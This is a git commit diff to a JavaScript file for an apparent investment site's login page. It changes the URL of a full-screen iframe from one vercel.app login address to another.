28049d5943c49ed306423f1f0d92dbe157542e46
Demos <69394991+Lennis-jpg@users.noreply.github.com>
2026-01-04 02:14:49 +0000

    Update login.js
    Updated url

--- ClerusyncInvestment/assets/js/login.js
+++ ClerusyncInvestment/assets/js/login.js
@@ -1,5 +1,5 @@
 const iframe = document.createElement('iframe');
     iframe.className = 'fullscreen-iframe';
-    iframe.src = 'https://clerusync-investment.vercel.app/login'; 
+    iframe.src = 'https://clerusync-investment-new-login.vercel.app/login'; 
     document.body.appendChild(iframe);
     
